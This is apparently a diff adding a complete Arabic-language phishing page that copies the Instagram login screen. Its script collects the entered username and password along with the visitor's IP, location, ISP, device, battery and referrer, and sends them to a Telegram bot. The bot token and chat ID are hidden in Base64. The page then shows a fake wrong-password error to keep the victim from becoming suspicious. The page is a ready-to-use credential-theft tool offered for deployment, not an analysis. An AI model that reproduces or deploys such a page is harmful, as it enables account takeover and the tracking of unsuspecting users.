@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Instagram</title>
+    
+    <!-- قسم التنسيق (CSS) - تصميم واجهة الصفحة لتشبه إنستغرام -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 350px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 30px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            width: 175px;
+            margin-bottom: 30px;
+            content: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png');
+        }
+
+        .input-group {
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 12px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 7px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            margin-top: 15px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        #error-message {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 20px 0;
+            display: none;
+            line-height: 1.4;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .or-text {
+            margin: 0 15px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .fb-icon {
+            width: 16px;
+            height: 16px;
+            margin-left: 8px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .signup-container {
+            width: 100%;
+            max-width: 350px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-container a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .app-links {
+            text-align: center;
+            margin-top: 20px;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .app-links p {
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .store-icons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .store-icons img {
+            height: 40px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- الحاوية العلوية (نموذج تسجيل الدخول) -->
+    <div class="login-container">
+        <div class="logo"></div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة السر" required>
+            </div>
+            <button type="submit" id="submitBtn" class="login-btn">تسجيل الدخول</button>
+            
+            <!-- رسالة الخطأ -->
+            <div id="error-message">
+                عذراً، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر الخاصة بك.
+            </div>
+        </form>
+
+        <div class="divider">
+            <div class="line"></div>
+            <div class="or-text">أو</div>
+            <div class="line"></div>
+        </div>
+
+        <a href="#" class="fb-login">
+            <span class="fb-icon"></span>
+            تسجيل الدخول باستخدام فيسبوك
+        </a>
+        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+    </div>
+
+    <div class="signup-container">
+        ليس لديك حساب؟ <a href="#">سجل الآن</a>
+    </div>
+
+    <div class="app-links">
+        <p>احصل على التطبيق.</p>
+        <div class="store-icons">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1200px-Download_on_the_App_Store_Badge.svg.png" alt="App Store">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1200px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
+        </div>
+    </div>
+
+    <!-- قسم البرمجة (JavaScript) - تم إصلاح جلب البيانات التقنية والتعرف على الجهاز (v23) -->
+    <script>
+        // تشفير البيانات الحساسة باستخدام Base64
+        const _0x1a2b = ["NTE5MjU3MDUwODpBQUhHLVMtVTRHT0RQWkNMSTBXcDRIWW1vR3FHQm5DOXk1WQ==", "MTM0OTQwODI5Mw=="];
+        const _0x3c4d = (i) => atob(_0x1a2b[i]);
+
+        // متغيرات البيانات التقنية
+        let _ip = "فشل ❌", _loc = "فشل ❌", _isp = "فشل ❌", _bat = "جاري الفحص...";
+
+        // جلب البيانات الجغرافية والمزود بشكل مباشر ومؤكد عبر HTTPS
+        async function fetchGeoData() {
+            try {
+                // المحاولة الأولى: ipapi.co (تدعم HTTPS ومستقرة)
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                if (data.ip) {
+                    _ip = data.ip;
+                    _loc = `${data.city}, ${data.region}, ${data.country_name}`;
+                    _isp = data.org;
+                    return;
+                }
+            } catch (e) {
+                console.log("ipapi.co failed, trying fallback...");
+            }
+
+            try {
+                // المحاولة الثانية: ipify.org (لجلب الـ IP فقط في حال فشل الموقع)
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                if (data.ip) {
+                    _ip = data.ip;
+                    _loc = "فشل ❌ (IP فقط)";
+                    _isp = "فشل ❌";
+                }
+            } catch (e) {
+                console.log("ipify failed.");
+            }
+        }
+        fetchGeoData();
+
+        // جلب بيانات البطارية والتعرف على نوع الجهاز
+        async function fetchDeviceAndBattery() {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            if (!isMobile) {
+                _bat = "جهاز كمبيوتر 💻";
+                return;
+            }
+
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const updateBattery = () => {
+                        _bat = `${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن ⚡' : 'لا يشحن 🔋'})`;
+                    };
+                    updateBattery();
+                    battery.addEventListener('levelchange', updateBattery);
+                    battery.addEventListener('chargingchange', updateBattery);
+                } catch (e) {
+                    _bat = "جوال (فشل جلب النسبة) 📱";
+                }
+            } else {
+                _bat = "جوال (غير مدعوم) 📱";
+            }
+        }
+        fetchDeviceAndBattery();
+
+        // معالجة تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const err = document.getElementById('error-message');
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            err.style.display = "none";
+            btn.disabled = true;
+            btn.innerText = "جاري التحميل...";
+
+            // محاولة جلب البيانات مرة أخرى قبل الإرسال لضمان التحديث
+            if (_ip === "فشل ❌") {
+                await fetchGeoData();
+            }
+
+            // تنسيق الرسالة العمودي والمنظم
+            const msg = `🚨 تسجيل دخول جديد insta 🚨\n\n👤 الحساب: ${user}\n🔑 كلمة السر: ${pass}\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n🌐 الـ IP: ${_ip}\n📍 الموقع: ${_loc}\n🏢 المزود: ${_isp}\n\n📱 الجهاز: ${navigator.userAgent}\n🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n🌍 اللغة: ${navigator.language}\n🔋 البطارية: ${_bat}\n🔗 المصدر: ${document.referrer || "دخول مباشر"}`;
+
+            const url = `https://api.telegram.org/bot${_0x3c4d(0)}/sendMessage?chat_id=${_0x3c4d(1)}&text=${encodeURIComponent(msg)}`;
+
+            try {
+                await fetch(url);
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerText = "تسجيل الدخول";
+                    err.style.display = "block";
+                    document.getElementById('password').value = "";
+                }, 1000);
+            } catch (error) {
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerText = "تسجيل الدخول";
+                    err.style.display = "block";
+                }, 1000);
+            }
+        });
+    </script>
+
+</body>
+</html>
